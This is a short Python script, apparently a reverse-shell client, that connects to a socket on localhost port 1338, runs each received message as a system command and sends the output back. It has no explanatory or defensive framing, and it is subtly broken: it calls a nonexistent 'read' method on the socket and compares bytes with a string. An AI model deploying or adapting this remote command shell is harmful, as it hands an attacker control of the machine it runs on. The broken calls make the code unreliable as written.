from socket import socket, AF_INET, SOCK_STREAM
from functools import partial
from subprocess import Popen,PIPE

s = socket(AF_INET,SOCK_STREAM)
s.connect(("127.0.0.1",1338))

for msg in iter(partial(s.read,1024),"quit()"):
    a = Popen(msg,stdout=PIPE,stderr=PIPE)
    s.send((a.stdout.read(),a.stderr.read()).__str__().encode())
    
